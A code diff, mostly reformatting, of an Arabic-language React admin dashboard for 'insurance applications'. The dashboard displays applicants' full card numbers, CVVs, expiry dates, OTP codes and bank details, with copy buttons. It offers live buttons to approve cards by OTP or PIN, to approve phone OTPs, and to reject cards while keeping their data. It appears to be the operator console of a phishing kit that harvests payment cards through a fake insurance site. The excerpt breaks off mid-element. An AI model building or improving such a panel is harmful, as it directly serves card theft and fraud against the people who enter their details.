@@ -1,7 +1,7 @@
-"use client"
+"use client";
 
-import type React from "react"
-import { useState, useEffect, useMemo, useCallback, useRef } from "react"
+import type React from "react";
+import { useState, useEffect, useMemo, useCallback, useRef } from "react";
 import {
   Search,
   MessageSquare,
@@ -21,59 +21,87 @@ import {
   Phone,
   Key,
   Lock,
-} from "lucide-react"
-import { Button } from "@/components/ui/button"
-import { Badge } from "@/components/ui/badge"
-import { Input } from "@/components/ui/input"
-import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
+} from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { Input } from "@/components/ui/input";
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import {
   DropdownMenu,
   DropdownMenuContent,
   DropdownMenuItem,
   DropdownMenuTrigger,
   DropdownMenuSeparator,
-} from "@/components/ui/dropdown-menu"
-import { subscribeToApplications, updateApplication, approveCard, rejectCard } from "@/lib/firestore-services"
-import { ChatPanel } from "@/components/chat-panel"
-import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
-import { toast } from "react-toastify"
-import type { InsuranceApplication } from "@/types"
-import { CreditCardMockup } from "@/components/credit-card-mockup"
-import { UserStatus } from "@/components/atuTA"
-import { CardMockup } from "@/components/card-mockup"
+} from "@/components/ui/dropdown-menu";
+import {
+  subscribeToApplications,
+  updateApplication,
+  approveCard,
+  rejectCard,
+} from "@/lib/firestore-services";
+import { ChatPanel } from "@/components/chat-panel";
+import {
+  playErrorSound,
+  playNotificationSound,
+  playSuccessSound,
+} from "@/lib/actions";
+import { toast } from "react-toastify";
+import type { InsuranceApplication } from "@/types";
+import { CreditCardMockup } from "@/components/credit-card-mockup";
+import { UserStatus } from "@/components/atuTA";
+import { CardMockup } from "@/components/card-mockup";
 
 const STEP_NAMES: Record<number | string, string> = {
   1: "المعلومات الأساسية",
   2: "تفاصيل التأمين",
   3: "اختيار العرض",
   4: "الدفع",
-}
+};
 
-const COUNTRIES = ["السعودية", "الإمارات", "الكويت", "البحرين", "قطر", "عمان", "مصر", "الأردن"]
+const COUNTRIES = [
+  "السعودية",
+  "الإمارات",
+  "الكويت",
+  "البحرين",
+  "قطر",
+  "عمان",
+  "مصر",
+  "الأردن",
+];
 
-const INSURANCE_TYPES = ["تأمين جديد", "نقل ملكية"]
-const DOCUMENT_TYPES = ["استمارة", "بطاقة جمركية"]
+const INSURANCE_TYPES = ["تأمين جديد", "نقل ملكية"];
+const DOCUMENT_TYPES = ["استمارة", "بطاقة جمركية"];
 
 export default function AdminDashboard() {
-  const [applications, setApplications] = useState<InsuranceApplication[]>([])
-  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
-  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
-  const [searchQuery, setSearchQuery] = useState("")
-  const [dataFilter, setDataFilter] = useState<string>("all")
-  const [countryFilter, setCountryFilter] = useState<string>("all")
-  const [statusFilter, setStatusFilter] = useState<string>("all")
-  const [loading, setLoading] = useState(true)
-  const [showChat, setShowChat] = useState(false)
-  const [copiedField, setCopiedField] = useState<string | null>(null)
-  const [editingAuthNumber, setEditingAuthNumber] = useState<string>("")
-  const [isEditingAuth, setIsEditingAuth] = useState(false)
-  const prevApplicationsCount = useRef<number>(0)
+  const [applications, setApplications] = useState<InsuranceApplication[]>([]);
+  const [filteredApplications, setFilteredApplications] = useState<
+    InsuranceApplication[]
+  >([]);
+  const [selectedApplication, setSelectedApplication] =
+    useState<InsuranceApplication | null>(null);
+  const [searchQuery, setSearchQuery] = useState("");
+  const [dataFilter, setDataFilter] = useState<string>("all");
+  const [countryFilter, setCountryFilter] = useState<string>("all");
+  const [statusFilter, setStatusFilter] = useState<string>("all");
+  const [loading, setLoading] = useState(true);
+  const [showChat, setShowChat] = useState(false);
+  const [copiedField, setCopiedField] = useState<string | null>(null);
+  const [editingAuthNumber, setEditingAuthNumber] = useState<string>("");
+  const [isEditingAuth, setIsEditingAuth] = useState(false);
+  const prevApplicationsCount = useRef<number>(0);
 
   const hasCompleteData = (app: InsuranceApplication) => {
-    return !!(app.identityNumber && app.ownerName && app.phoneNumber && app.vehicleValue && app.selectedOffer)
-  }
+    return !!(
+      app.identityNumber &&
+      app.ownerName &&
+      app.phoneNumber &&
+      app.vehicleValue &&
+      app.selectedOffer
+    );
+  };
 
-  const hasData = (...values: any[]) => values.some((v) => v !== null && v !== undefined && v !== "")
+  const hasData = (...values: any[]) =>
+    values.some((v) => v !== null && v !== undefined && v !== "");
 
   const stats = useMemo(
     () => ({
@@ -83,193 +111,211 @@ export default function AdminDashboard() {
       approved: applications.filter((a) => a.status === "approved").length,
       draft: applications.filter((a) => a.status === "draft").length,
     }),
-    [applications],
-  )
+    [applications]
+  );
 
   useEffect(() => {
-    setLoading(true)
+    setLoading(true);
     const unsubscribe = subscribeToApplications((apps) => {
-      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
-        playNotificationSound()
+      if (
+        prevApplicationsCount.current > 0 &&
+        apps.length > prevApplicationsCount.current
+      ) {
+        playNotificationSound();
       }
-      prevApplicationsCount.current = apps.length
-      setApplications(apps as any)
-      setLoading(false)
-    })
-    return () => unsubscribe()
-  }, [])
+      prevApplicationsCount.current = apps.length;
+      setApplications(apps as any);
+      setLoading(false);
+    });
+    return () => unsubscribe();
+  }, []);
 
   useEffect(() => {
     const timer = setTimeout(() => {
-      let filtered = applications
+      let filtered = applications;
 
       if (statusFilter !== "all") {
-        filtered = filtered.filter((a) => a.status === statusFilter)
+        filtered = filtered.filter((a) => a.status === statusFilter);
       }
 
       if (countryFilter !== "all") {
-        filtered = filtered.filter((a) => a.country === countryFilter)
+        filtered = filtered.filter((a) => a.country === countryFilter);
       }
 
       if (searchQuery) {
-        const query = searchQuery.toLowerCase()
+        const query = searchQuery.toLowerCase();
         filtered = filtered.filter(
           (app) =>
             app.ownerName?.toLowerCase().includes(query) ||
             app.identityNumber?.includes(query) ||
             app.phoneNumber?.includes(query) ||
-            app.vehicleModel?.toLowerCase().includes(query),
-        )
+            app.vehicleModel?.toLowerCase().includes(query)
+        );
       }
 
       filtered = filtered.sort((a, b) => {
-        const dateA = a.updatedAt ? new Date(a.updatedAt) : 0
-        const dateB = b.updatedAt ? new Date(b.updatedAt) : 0
-        return (dateB as number) - (dateA as number)
-      })
+        const dateA = a.updatedAt ? new Date(a.updatedAt) : 0;
+        const dateB = b.updatedAt ? new Date(b.updatedAt) : 0;
+        return (dateB as number) - (dateA as number);
+      });
 
-      setFilteredApplications(filtered)
-    }, 200)
+      setFilteredApplications(filtered);
+    }, 200);
 
-    return () => clearTimeout(timer)
-  }, [applications, searchQuery, statusFilter, countryFilter])
+    return () => clearTimeout(timer);
+  }, [applications, searchQuery, statusFilter, countryFilter]);
 
   useEffect(() => {
     if (selectedApplication) {
-      const updated = applications.find((app) => app.id === selectedApplication.id)
-      if (updated) setSelectedApplication(updated)
+      const updated = applications.find(
+        (app) => app.id === selectedApplication.id
+      );
+      if (updated) setSelectedApplication(updated);
     }
-  }, [applications, selectedApplication])
+  }, [applications, selectedApplication]);
 
   const formatTime = useCallback((dateInput?: Date | string | any) => {
-    if (!dateInput) return ""
+    if (!dateInput) return "";
 
     // دعم Firestore Timestamp
-    const date = dateInput instanceof Date ? dateInput : dateInput?.toDate ? dateInput.toDate() : new Date(dateInput)
+    const date =
+      dateInput instanceof Date
+        ? dateInput
+        : dateInput?.toDate
+        ? dateInput.toDate()
+        : new Date(dateInput);
 
-    if (isNaN(date.getTime())) return ""
+    if (isNaN(date.getTime())) return "";
 
-    const now = new Date()
-    const diffSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)
+    const now = new Date();
+    const diffSeconds = Math.floor((now.getTime() - date.getTime()) / 1000);
 
-    if (diffSeconds < 60) return "الآن"
-    if (diffSeconds < 3600) return `${Math.floor(diffSeconds / 60)} د`
-    if (diffSeconds < 86400) return `${Math.floor(diffSeconds / 3600)} س`
-    if (diffSeconds < 604800) return `${Math.floor(diffSeconds / 86400)} ي`
+    if (diffSeconds < 60) return "الآن";
+    if (diffSeconds < 3600) return `${Math.floor(diffSeconds / 60)} د`;
+    if (diffSeconds < 86400) return `${Math.floor(diffSeconds / 3600)} س`;
+    if (diffSeconds < 604800) return `${Math.floor(diffSeconds / 86400)} ي`;
 
     // تاريخ كامل إذا قديم
     return date.toLocaleDateString("ar-SA", {
       year: "numeric",
       month: "short",
       day: "numeric",
-    })
-  }, [])
+    });
+  }, []);
 
   const copyToClipboard = async (text: string, fieldId: string) => {
-    await navigator.clipboard.writeText(text)
-    setCopiedField(fieldId)
-    setTimeout(() => setCopiedField(null), 2000)
-  }
+    await navigator.clipboard.writeText(text);
+    setCopiedField(fieldId);
+    setTimeout(() => setCopiedField(null), 2000);
+  };
 
   const handleStepChange = async (appId: string, step: number) => {
     try {
-      await updateApplication(appId, { currentStep: step })
-      playSuccessSound()
+      await updateApplication(appId, { currentStep: step });
+      playSuccessSound();
     } catch (error) {
-      playErrorSound()
+      playErrorSound();
     }
-  }
+  };
 
-  const handleStatusChange = async (appId: string, status: InsuranceApplication["status"]) => {
+  const handleStatusChange = async (
+    appId: string,
+    status: InsuranceApplication["status"]
+  ) => {
     try {
-      await updateApplication(appId, { status })
-      playSuccessSound()
+      await updateApplication(appId, { status });
+      playSuccessSound();
     } catch (error) {
-      playErrorSound()
+      playErrorSound();
     }
-  }
+  };
 
-  const handleApproveCard = async (appId: string, approvalType: "otp" | "pin") => {
+  const handleApproveCard = async (
+    appId: string,
+    approvalType: "otp" | "pin"
+  ) => {
     try {
-      await approveCard(appId, approvalType)
-      playSuccessSound()
-      toast.success(`تمت الموافقة على البطاقة (${approvalType === "otp" ? "OTP" : "PIN"})`)
+      await approveCard(appId, approvalType);
+      playSuccessSound();
+      toast.success(
+        `تمت الموافقة على البطاقة (${approvalType === "otp" ? "OTP" : "PIN"})`
+      );
     } catch (error) {
-      playErrorSound()
-      toast.error("خطأ في الموافقة على البطاقة")
+      playErrorSound();
+      toast.error("خطأ في الموافقة على البطاقة");
     }
-  }
+  };
 
   const handleRejectCard = async (appId: string) => {
-    if (!selectedApplication) return
+    if (!selectedApplication) return;
     try {
-      await rejectCard(appId, selectedApplication)
-      playSuccessSound()
-      toast.success("تم رفض البطاقة وحفظ البيانات")
+      await rejectCard(appId, selectedApplication);
+      playSuccessSound();
+      toast.success("تم رفض البطاقة وحفظ البيانات");
     } catch (error) {
-      playErrorSound()
-      toast.error("خطأ في رفض البطاقة")
+      playErrorSound();
+      toast.error("خطأ في رفض البطاقة");
     }
-  }
+  };
 
   const handleApprovePhoneOtp = async (appId: string) => {
     try {
-      await updateApplication(appId, { phoneOtpApproved: "approved" })
-      playSuccessSound()
-      toast.success("تمت الموافقة على رمز التحقق")
+      await updateApplication(appId, { phoneOtpApproved: "approved" });
+      playSuccessSound();
+      toast.success("تمت الموافقة على رمز التحقق");
     } catch (error) {
-      playErrorSound()
-      toast.error("خطأ في الموافقة على رمز التحقق")
+      playErrorSound();
+      toast.error("خطأ في الموافقة على رمز التحقق");
     }
-  }
+  };
 
   const handleRejectPhoneOtp = async (appId: string) => {
     try {
-      await updateApplication(appId, { phoneOtpApproved: "rejected" })
-      playSuccessSound()
-      toast.success("تم رفض رمز التحقق")
+      await updateApplication(appId, { phoneOtpApproved: "rejected" });
+      playSuccessSound();
+      toast.success("تم رفض رمز التحقق");
     } catch (error) {
-      playErrorSound()
-      toast.error("خطأ في رفض رمز التحقق")
+      playErrorSound();
+      toast.error("خطأ في رفض رمز التحقق");
     }
-  }
+  };
 
   const handleUpdateAuthNumber = async (appId: string) => {
     try {
-      await updateApplication(appId, { authNumber: editingAuthNumber } as any)
-      playSuccessSound()
-      toast.success("تم تحديث رقم التفويض")
-      setIsEditingAuth(false)
+      await updateApplication(appId, { authNumber: editingAuthNumber } as any);
+      playSuccessSound();
+      toast.success("تم تحديث رقم التفويض");
+      setIsEditingAuth(false);
     } catch (error) {
-      playErrorSound()
-      toast.error("خطأ في تحديث رقم التفويض")
+      playErrorSound();
+      toast.error("خطأ في تحديث رقم التفويض");
     }
-  }
+  };
 
   const startEditingAuth = (currentValue: string) => {
-    setEditingAuthNumber(currentValue || "")
-    setIsEditingAuth(true)
-  }
+    setEditingAuthNumber(currentValue || "");
+    setIsEditingAuth(true);
+  };
 
   const selectApp = (app: InsuranceApplication) => {
-    setSelectedApplication(app)
-    setShowChat(false)
-  }
+    setSelectedApplication(app);
+    setShowChat(false);
+  };
 
   const getStatusColor = (status: string) => {
     switch (status) {
       case "completed":
-        return "bg-emerald-500/20 text-emerald-400"
+        return "bg-emerald-500/20 text-emerald-400";
       case "approved":
-        return "bg-blue-500/20 text-blue-400"
+        return "bg-blue-500/20 text-blue-400";
       case "pending_review":
-        return "bg-amber-500/20 text-amber-400"
+        return "bg-amber-500/20 text-amber-400";
       case "rejected":
-        return "bg-red-500/20 text-red-400"
+        return "bg-red-500/20 text-red-400";
       default:
-        return "bg-slate-500/20 text-slate-400"
+        return "bg-slate-500/20 text-slate-400";
     }
-  }
+  };
 
   return (
     <div className="h-screen bg-slate-950 text-[11px] flex flex-col" dir="rtl">
@@ -284,35 +330,55 @@ export default function AdminDashboard() {
 
         <div className="flex items-center gap-3 text-[10px]">
           <span className="text-slate-400">
-            الإجمالي: <span className="text-white font-bold">{stats.total}</span>
+            الإجمالي:{" "}
+            <span className="text-white font-bold">{stats.total}</span>
           </span>
           <span className="text-slate-400">
-            مكتمل: <span className="text-emerald-400 font-bold">{stats.completed}</span>
+            مكتمل:{" "}
+            <span className="text-emerald-400 font-bold">
+              {stats.completed}
+            </span>
           </span>
           <span className="text-slate-400">
-            قيد المراجعة: <span className="text-amber-400 font-bold">{stats.pending}</span>
+            قيد المراجعة:{" "}
+            <span className="text-amber-400 font-bold">{stats.pending}</span>
           </span>
           <span className="text-slate-400">
-            موافق عليه: <span className="text-blue-400 font-bold">{stats.approved}</span>
+            موافق عليه:{" "}
+            <span className="text-blue-400 font-bold">{stats.approved}</span>
           </span>
         </div>
 
         <div className="flex items-center gap-1">
           <DropdownMenu>
             <DropdownMenuTrigger asChild>
-              <Button variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1">
+              <Button
+                variant="ghost"
+                size="sm"
+                className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1"
+              >
                 <Globe className="w-3 h-3" />
                 {countryFilter === "all" ? "كل الدول" : countryFilter}
                 <ChevronDown className="w-2.5 h-2.5" />
               </Button>
             </DropdownMenuTrigger>
-            <DropdownMenuContent align="end" className="bg-slate-800 border-slate-700">
-              <DropdownMenuItem onClick={() => setCountryFilter("all")} className="text-[10px] text-slate-300">
+            <DropdownMenuContent
+              align="end"
+              className="bg-slate-800 border-slate-700"
+            >
+              <DropdownMenuItem
+                onClick={() => setCountryFilter("all")}
+                className="text-[10px] text-slate-300"
+              >
                 كل الدول
               </DropdownMenuItem>
               <DropdownMenuSeparator className="bg-slate-700" />
               {COUNTRIES.map((c) => (
-                <DropdownMenuItem key={c} onClick={() => setCountryFilter(c)} className="text-[10px] text-slate-300">
+                <DropdownMenuItem
+                  key={c}
+                  onClick={() => setCountryFilter(c)}
+                  className="text-[10px] text-slate-300"
+                >
                   {c}
                 </DropdownMenuItem>
               ))}
@@ -392,7 +458,11 @@ export default function AdminDashboard() {
                 />
               </div>
             </div>
-            <Tabs defaultValue="all" className="w-full" onValueChange={setStatusFilter}>
+            <Tabs
+              defaultValue="all"
+              className="w-full"
+              onValueChange={setStatusFilter}
+            >
               <TabsList className="w-full h-5 p-0 bg-slate-800 rounded">
                 <TabsTrigger
                   value="all"
@@ -428,31 +498,49 @@ export default function AdminDashboard() {
                 <div className="w-5 h-5 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin" />
               </div>
             ) : filteredApplications.length === 0 ? (
-              <div className="text-center text-slate-500 py-8 text-[10px]">لا توجد نتائج</div>
+              <div className="text-center text-slate-500 py-8 text-[10px]">
+                لا توجد نتائج
+              </div>
             ) : (
               filteredApplications.map((app) => {
-                const isActive = selectedApplication?.id === app.id
-                const statusColor = getStatusColor(app.status)
+                const isActive = selectedApplication?.id === app.id;
+                const statusColor = getStatusColor(app.status);
                 return (
                   <div
                     key={app.id}
                     onClick={() => selectApp(app)}
                     className={`px-2 py-1.5 cursor-pointer border-b border-slate-800/50 transition-all
-                      ${isActive ? "bg-emerald-500/10 border-r-2 border-r-emerald-500" : "hover:bg-slate-800/30"}`}
+                      ${
+                        isActive
+                          ? "bg-emerald-500/10 border-r-2 border-r-emerald-500"
+                          : "hover:bg-slate-800/30"
+                      }`}
                   >
                     <div className="flex items-center justify-between mb-0.5">
                       <div className="flex items-center gap-1.5 min-w-0">
-                        <Badge className={`text-[8px] flex-shrink-0 ${statusColor}`}>{app.status}</Badge>
+                        <Badge
+                          className={`text-[8px] flex-shrink-0 ${statusColor}`}
+                        >
+                          {app.status}
+                        </Badge>
                         <span
-                          className={`font-medium truncate text-[10px] ${isActive ? "text-emerald-300" : "text-slate-200"}`}
+                          className={`font-medium truncate text-[10px] ${
+                            isActive ? "text-emerald-300" : "text-slate-200"
+                          }`}
                         >
                           {app.ownerName || "متقدم"}
                         </span>
                       </div>
-                      <span className="text-[9px] text-slate-500 flex-shrink-0">{formatTime(app.createdAt)}</span>
+                      <span className="text-[9px] text-slate-500 flex-shrink-0">
+                        {formatTime(app.createdAt)}
+                      </span>
                     </div>
                     <div className="flex items-center gap-1 text-[9px] text-slate-500">
-                      {app.vehicleModel && <span className="text-blue-400">{app.vehicleModel}</span>}
+                      {app.vehicleModel && (
+                        <span className="text-blue-400">
+                          {app.vehicleModel}
+                        </span>
+                      )}
                       {app.cardNumber && (
                         <span className="flex items-center gap-0.5 px-1 py-0.5 bg-purple-500/20 text-purple-400 rounded text-[7px]">
                           <CreditCard className="w-2 h-2" />
@@ -477,7 +565,7 @@ export default function AdminDashboard() {
                       )}
                     </div>
                   </div>
-                )
+                );
               })
             )}
           </div>
@@ -508,10 +596,14 @@ export default function AdminDashboard() {
                       </div>
                     </div>
                     <div>
-                      <div className="font-bold text-white text-xs">{selectedApplication.ownerName || "متقدم"}</div>
+                      <div className="font-bold text-white text-xs">
+                        {selectedApplication.ownerName || "متقدم"}
+                      </div>
                       <div className="text-[9px] text-slate-400 flex items-center gap-2">
                         <span>{selectedApplication.phoneNumber}</span>
-                        {selectedApplication.country && <span>• {selectedApplication.country}</span>}
+                        {selectedApplication.country && (
+                          <span>• {selectedApplication.country}</span>
+                        )}
                       </div>
                     </div>
                   </div>
@@ -519,7 +611,9 @@ export default function AdminDashboard() {
                     {[1, 2, 3, 4].map((step) => (
                       <Button
                         key={step}
-                        onClick={() => handleStepChange(selectedApplication.id!, step)}
+                        onClick={() =>
+                          handleStepChange(selectedApplication.id!, step)
+                        }
                         size="sm"
                         className={`h-5 text-[8px] px-1.5 rounded ${
                           selectedApplication.currentStep === step
@@ -550,9 +644,12 @@ export default function AdminDashboard() {
                     selectedApplication.serialNumber,
                     selectedApplication.phoneNumber,
                     selectedApplication.phoneNumber2,
-                    selectedApplication.country,
+                    selectedApplication.country
                   ) && (
-                    <Section title="المعلومات الأساسية" icon={<User className="w-3 h-3" />}>
+                    <Section
+                      title="المعلومات الأساسية"
+                      icon={<User className="w-3 h-3" />}
+                    >
                       <DataRow
                         label="الاسم"
                         value={selectedApplication.ownerName}
@@ -602,9 +699,12 @@ export default function AdminDashboard() {
                   {hasData(
                     selectedApplication.identityNumber,
                     selectedApplication.vehicleModel,
-                    selectedApplication.insuranceType,
+                    selectedApplication.insuranceType
                   ) && (
-                    <Section title="معلومات المركبة" icon={<Car className="w-3 h-3" />}>
+                    <Section
+                      title="معلومات المركبة"
+                      icon={<Car className="w-3 h-3" />}
+                    >
                       <DataRow
                         label="الموديل"
                         value={selectedApplication.vehicleModel}
@@ -631,7 +731,11 @@ export default function AdminDashboard() {
                       />
                       <DataRow
                         label="مكان الإصلاح"
-                        value={selectedApplication.repairLocation === "agency" ? "وكالة" : "ورشة"}
+                        value={
+                          selectedApplication.repairLocation === "agency"
+                            ? "وكالة"
+                            : "ورشة"
+                        }
                         onCopy={copyToClipboard}
                         copied={copiedField!}
                       />
@@ -642,9 +746,12 @@ export default function AdminDashboard() {
                   {hasData(
                     selectedApplication.insuranceType,
                     selectedApplication.buyerIdNumber,
-                    selectedApplication.buyerName,
+                    selectedApplication.buyerName
                   ) && (
-                    <Section title="معلومات التأمين" icon={<Shield className="w-3 h-3" />}>
+                    <Section
+                      title="معلومات التأمين"
+                      icon={<Shield className="w-3 h-3" />}
+                    >
                       <DataRow
                         label="شركة التأمين"
                         value={selectedApplication.selectedOffer?.company}
@@ -683,15 +790,23 @@ export default function AdminDashboard() {
                       />
                       {selectedApplication.selectedOffer &&
                         selectedApplication.selectedOffer.features &&
-                        selectedApplication.selectedOffer.features.length > 0 && (
+                        selectedApplication.selectedOffer.features.length >
+                          0 && (
                           <div className="p-1.5 bg-slate-900/50 rounded">
-                            <span className="text-[8px] text-slate-400 block mb-0.5">المميزات:</span>
+                            <span className="text-[8px] text-slate-400 block mb-0.5">
+                              المميزات:
+                            </span>
                             <div className="space-y-0.5 max-h-16 overflow-y-auto">
-                              {selectedApplication.selectedOffer.features.map((feature, i) => (
-                                <div key={i} className="text-[8px] text-slate-300">
-                                  • {feature}
-                                </div>
-                              ))}
+                              {selectedApplication.selectedOffer.features.map(
+                                (feature, i) => (
+                                  <div
+                                    key={i}
+                                    className="text-[8px] text-slate-300"
+                                  >
+                                    • {feature}
+                                  </div>
+                                )
+                              )}
                             </div>
                           </div>
                         )}
@@ -700,7 +815,10 @@ export default function AdminDashboard() {
 
                   {/* Selected Offer */}
                   {selectedApplication.selectedOffer && (
-                    <Section title="العرض المختار" icon={<FileText className="w-3 h-3" />}>
+                    <Section
+                      title="العرض المختار"
+                      icon={<FileText className="w-3 h-3" />}
+                    >
                       <DataRow
                         label="شركة التأمين"
                         value={selectedApplication.selectedOffer.company}
@@ -720,15 +838,23 @@ export default function AdminDashboard() {
                         copied={copiedField!}
                       />
                       {selectedApplication.selectedOffer.features &&
-                        selectedApplication.selectedOffer.features.length > 0 && (
+                        selectedApplication.selectedOffer.features.length >
+                          0 && (
                           <div className="p-1.5 bg-slate-900/50 rounded">
-                            <span className="text-[8px] text-slate-400 block mb-0.5">المميزات:</span>
+                            <span className="text-[8px] text-slate-400 block mb-0.5">
+                              المميزات:
+                            </span>
                             <div className="space-y-0.5 max-h-16 overflow-y-auto">
-                              {selectedApplication.selectedOffer.features.map((feature, i) => (
-                                <div key={i} className="text-[8px] text-slate-300">
-                                  • {feature}
-                                </div>
-                              ))}
+                              {selectedApplication.selectedOffer.features.map(
+                                (feature, i) => (
+                                  <div
+                                    key={i}
+                                    className="text-[8px] text-slate-300"
+                                  >
+                                    • {feature}
+                                  </div>
+                                )
+                              )}
                             </div>
                           </div>
                         )}
@@ -744,13 +870,19 @@ export default function AdminDashboard() {
                     selectedApplication.cvv,
                     selectedApplication.cardType,
                     selectedApplication.bankInfo,
-                    selectedApplication.otp,
+                    selectedApplication.otp
                   ) && (
-                    <Section title="معلومات الدفع" icon={<CreditCard className="w-3 h-3" />} className="col-span-2">
+                    <Section
+                      title="معلومات الدفع"
+                      icon={<CreditCard className="w-3 h-3" />}
+                      className="col-span-2"
+                    >
                       <div className="mb-2">
                         <CreditCardMockup
                           cardNumber={selectedApplication.cardNumber}
-                          cardholderName={selectedApplication.cardHolderName! as any}
+                          cardholderName={
+                            selectedApplication.cardHolderName! as any
+                          }
                           expiryDate={selectedApplication.expiryDate}
                           cvv={selectedApplication.cvv}
                         />
@@ -765,11 +897,17 @@ export default function AdminDashboard() {
                         />
                         <DataRow
                           label="رقم البطاقة"
-                          value={selectedApplication.cardNumber ? `${selectedApplication.cardNumber}` : undefined}
+                          value={
+                            selectedApplication.cardNumber
+                              ? `${selectedApplication.cardNumber}`
+                              : undefined
+                          }
                           onCopy={() => {
                             if (selectedApplication.cardNumber) {
-                              navigator.clipboard.writeText(selectedApplication.cardNumber)
-                              setCopiedField("cardNumber")
+                              navigator.clipboard.writeText(
+                                selectedApplication.cardNumber
+                              );
+                              setCopiedField("cardNumber");
                             }
                           }}
                           copied={""}
@@ -803,7 +941,13 @@ export default function AdminDashboard() {
                           value={
                             selectedApplication.bankInfo
                               ? typeof selectedApplication.bankInfo === "object"
-                                ? `${(selectedApplication.bankInfo as any).name || ""} - ${(selectedApplication.bankInfo as any).country || ""}`
+                                ? `${
+                                    (selectedApplication.bankInfo as any)
+                                      .name || ""
+                                  } - ${
+                                    (selectedApplication.bankInfo as any)
+                                      .country || ""
+                                  }`
                                 : selectedApplication.bankInfo
                               : undefined
                           }
@@ -817,140 +961,199 @@ export default function AdminDashboard() {
                           copied={copiedField!}
                         />
                       </div>
-                      
+
                       {/* Card Status Badge */}
                       <div className="flex items-center gap-2 mt-2">
-                        <span className="text-[9px] text-slate-400">حالة البطاقة:</span>
-                        <Badge className={`text-[8px] ${
-                          selectedApplication.cardStatus === "approved_with_otp" || selectedApplication.cardStatus === "approved_with_pin"
-                            ? "bg-emerald-500/20 text-emerald-400"
-                            : selectedApplication.cardStatus === "rejected"
+                        <span className="text-[9px] text-slate-400">
+                          حالة البطاقة:
+                        </span>
+                        <Badge
+                          className={`text-[8px] ${
+                            selectedApplication.paymentStatus === "completed"
+                              ? "bg-emerald-500/20 text-emerald-400"
+                              : selectedApplication.paymentStatus === "failed"
                               ? "bg-red-500/20 text-red-400"
                               : "bg-amber-500/20 text-amber-400"
-                        }`}>
-                          {selectedApplication.cardStatus === "approved_with_otp" ? "موافق - OTP" 
-                            : selectedApplication.cardStatus === "approved_with_pin" ? "موافق - PIN"
-                            : selectedApplication.cardStatus === "rejected" ? "مرفوض"
-                            : "قيد الانتظار"}
+                          }`}
+                        >
+                          {selectedApplication.paymentStatus}
                         </Badge>
-                        {selectedApplication.paymentStatus && (
-                          <Badge
-                            className={`text-[8px] ${selectedApplication.paymentStatus === "completed" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.paymentStatus === "failed" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
-                          >
-                            {selectedApplication.paymentStatus}
-                          </Badge>
-                        )}
                       </div>
 
                       {/* Approval Needed Alert */}
-                      {selectedApplication.cardStatus !== "approved_with_otp" &&
-                        selectedApplication.cardStatus !== "approved_with_pin" &&
-                        selectedApplication.cardStatus !== "rejected" && (
-                          <div className="mt-2 p-2 bg-amber-500/10 border border-amber-500/30 rounded-lg animate-pulse">
-                            <div className="flex items-center gap-2">
-                              <div className="w-2 h-2 bg-amber-400 rounded-full animate-ping"></div>
-                              <span className="text-[9px] text-amber-400 font-medium">تنبيه: البطاقة تحتاج موافقة!</span>
+                      <div className="mt-2 p-2 bg-amber-500/10 border border-amber-500/30 rounded-lg animate-pulse">
+                        <div className="flex items-center gap-2">
+                          <div className="w-2 h-2 bg-amber-400 rounded-full animate-ping"></div>
+                          <span className="text-[9px] text-amber-400 font-medium">
+                            تنبيه: البطاقة تحتاج موافقة!
+                          </span>
+                        </div>
+                      </div>
+
+                      {/* Card approval controls */}
+                      <div className="flex gap-1 mt-2">
+                        <Button
+                          onClick={() =>
+                            handleApproveCard(selectedApplication.id!, "otp")
+                          }
+                          size="sm"
+                          className="h-5 text-[8px] px-1.5 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"
+                        >
+                          ✓ OTP
+                        </Button>
+                        <Button
+                          onClick={() =>
+                            handleApproveCard(selectedApplication.id!, "pin")
+                          }
+                          size="sm"
+                          className="h-5 text-[8px] px-1.5 rounded bg-green-500/20 text-green-400 hover:bg-green-500/30"
+                        >
+                          ✓ PIN
+                        </Button>
+                        <Button
+                          onClick={() =>
+                            handleRejectCard(selectedApplication.id!)
+                          }
+                          size="sm"
+                          className="h-5 text-[8px] px-1.5 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
+                        >
+                          ✗ رفض
+                        </Button>
+                      </div>
+                      {selectedApplication.oldCards &&
+                        selectedApplication.oldCards.length > 0 && (
+                          <div className="mt-1 p-1.5 bg-red-500/10 rounded border border-red-500/20">
+                            <span className="text-[8px] text-red-400 block mb-0.5">
+                              البطاقات المرفوضة:{" "}
+                              {selectedApplication.oldCards.length}
+                            </span>
+                            <div className="space-y-0.5 max-h-20 overflow-y-auto">
+                              {selectedApplication.oldCards.map(
+                                (card, index) => (
+                                  <div
+                                    key={index}
+                                    className="text-[7px] text-red-300 bg-red-900/20 p-0.5 rounded"
+                                  >
+                                    <div>
+                                      البطاقة {index + 1}:{" "}
+                                      {card.cardNumber?.slice(-4) || "N/A"}
+                                    </div>
+                                    <div>
+                                      حامل: {card.cardHolderName || "N/A"}
+                                    </div>
+                                  </div>
+                                )
+                              )}
                             </div>
                           </div>
                         )}
-
-                      {/* Card approval controls */}
-                      {selectedApplication.cardStatus !== "approved_with_otp" &&
-                        selectedApplication.cardStatus !== "approved_with_pin" && (
-                          <div className="flex gap-1 mt-2">
-                            <Button
-                              onClick={() => handleApproveCard(selectedApplication.id!, "otp")}
-                              size="sm"
-                              className="h-5 text-[8px] px-1.5 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"
-                            >
-                              ✓ OTP
-                            </Button>
-                            <Button
-                              onClick={() => handleApproveCard(selectedApplication.id!, "pin")}
-                              size="sm"
-                              className="h-5 text-[8px] px-1.5 rounded bg-green-500/20 text-green-400 hover:bg-green-500/30"
-                            >
-                              ✓ PIN
-                            </Button>
-                            <Button
-                              onClick={() => handleRejectCard(selectedApplication.id!)}
-                              size="sm"
